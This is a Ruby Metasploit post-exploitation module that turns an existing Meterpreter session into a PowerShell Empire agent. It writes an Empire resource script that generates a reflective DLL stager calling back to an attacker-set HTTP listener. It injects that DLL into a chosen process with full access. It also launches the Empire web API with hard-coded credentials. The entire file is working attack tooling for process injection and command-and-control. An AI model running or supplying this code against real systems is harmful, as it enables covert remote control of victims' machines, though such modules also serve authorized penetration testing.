##
# This module requires Metaspoit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/empire_lib'
require 'msf/core/Empire-UI'
require 'msf/base/sessions/empire'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::EmpireUI

  def initialize(info={})
    super(update_info(info,
                      "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled in your machine.",
                      "LICENSE"             => MSF_LICENSE,
                      "Platform"            => ["multi"],
                      "SessionTypes"        => ["meterpreter"],
                      "Author"              => ["author"]
                     ))
    register_options(
      [
        OptAddress.new('LHOST',
                       [false, 'Host to start the listener on']),
        OptPort.new('LPORT',
                    [false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
        OptString.new('PathToEmpire',
                      [true, 'The Complete Path to Empire-Web API']),
        OptInt.new('PID',
                   [true,'Process Identifier to inject the Empire payload into'])
      ])
  end
  def run
    #Storing user inputs.
    if datastore['LHOST']
      @host = datastore['LHOST']
    elsif framework.datastore['LHOST']
      @host = framework.datastore['LHOST']
    else
      @host = session.tunnel_local.split(':')[0]
      if @host == 'Local Pipe'
        print_error('LHOST is "Local Pipe", please manualy set the correct IP')
        return
      end
    end

    path = datastore['PathToEmpire'].to_s.chomp
    @port = datastore['LPORT'].to_s
    @pid = datastore['PID'].to_i
    @listener_name = 'Listener_Emp'

    #Changing the working directory to the provided path
    Dir.chdir(path)

    #method to initiate the web-API
    def initiate_API
      sleep(18)
      print_status("Initiating the Empire Web-API instance. Might take few moments")
      command = "netstat -nlt | grep 1337"
      value = system(command)
      raise "Port 1337 already in use." if value
      command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
      value = system(command)
    end

    #method to create the reflectivly injectable DLL
    def create_DLL
      print_status("Creating reflectively injectable Empire DLL")
      generate_reflective_DLL(@listener_name ,@host, @port)
    end

    #main function
    def main

      #Setting up Empire
      sleep(15)

      #Defining the payload path
      payload_path = '/tmp/launcher-emp.dll'

      #Injecting the created DLL payload reflectively in provided process
      host_process = client.sys.process.open(@pid, PROCESS_ALL_ACCESS)
      print_status("Injecting #{payload_path} into #{@pid}")
      dll_mem, offset = inject_dll_into_process(host_process, payload_path)
      print_status("DLL Injected. Executing Reflective loader")
      host_process.thread.create(dll_mem + offset, 0)
      print_status("DLL injected and invoked")
      print_status("Creating Empire instance")
      sleep(20)
      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')

      #Fetching the agent at an interval of 10 seconds.
      sleep(5)
      agents = client_emp.get_agents
      agents.each do |listener, session_id|
        if listener == @listener_name
          @agent_name = session_id.to_s
          print_status("Agent Connected : #{session_id} to listener : #{@listener_name}")
        end
      end

      #Register a Windows Session
      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, @agent_name)
      framework.sessions.register(empire_session)
      print_status("Empire Session created")

    end

    #method to generate reflective DLL from empire-cli
    def generate_reflective_DLL(listener_name, host, port)
      dll = File.open('/root/dll_generator.rc',"w")
      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Port #{port}\nset Host http://#{host}:#{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
      dll.close
      command = './empire --resource /root/dll_generator.rc > /dev/null'
      value = system(command)
    end

    #Commencing threads
    thread_api = Thread.new{
      initiate_API()
    }
    thread_cli = Thread.new{
      create_DLL()
    }
    thread_main = Thread.new{
      main()
    }

    #Joining the main thread
    thread_main.join

  end
end


